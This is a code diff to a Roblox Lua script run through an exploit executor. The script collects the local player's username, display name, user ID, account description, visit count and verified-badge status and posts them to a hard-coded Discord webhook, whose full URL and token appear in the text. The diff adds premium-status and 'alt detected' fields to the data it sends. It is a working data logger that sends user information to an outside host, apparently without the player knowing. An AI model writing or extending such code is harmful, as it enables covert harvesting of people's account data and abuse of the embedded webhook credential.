@@ -43,8 +43,22 @@ local response = HS:JSONDecode(
 
 local exploit,version = identifyexecutor() 
 
-local webh = "https://discord.com/api/webhooks/1055661279085338624/WfcuuFxTV2KZ0zkGRiskYQz7yqyDohTxeIq0IptmiyaQ6dFjJcwmrV5YH7hTcekjE6h8"
+local player = game:GetService"Players".LocalPlayer
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+   else 
+   premium = false
+end
 
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+local webh = "https://discord.com/api/webhooks/1055661279085338624/WfcuuFxTV2KZ0zkGRiskYQz7yqyDohTxeIq0IptmiyaQ6dFjJcwmrV5YH7hTcekjE6h8"
 
 pcall(function()
    local data = {
@@ -57,9 +71,11 @@ pcall(function()
        ['color'] = tonumber(16753920),
        ['fields'] = {
           {name = "**Users Profile**", value = ''.."https://www.roblox.com//users/"..game.Players.LocalPlayer.UserId.."/profile"},
+          {name = "**Premium Account**", value = premium},
           {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
           {name = '**DisplayName**', value = ''..game.Players.LocalPlayer.DisplayName},
           {name = "**UserID**", value = ''..game.Players.LocalPlayer.UserId},
+          {name = "**Alt Detected**", value = alt},
           {name = "**Games Visits**", value = ''..count},
           {name = "**Verified Badge**", value = ''..tostring(response.hasVerifiedBadge)},
           {name = '**Account Description**', value = "'"..response.description.."'"},
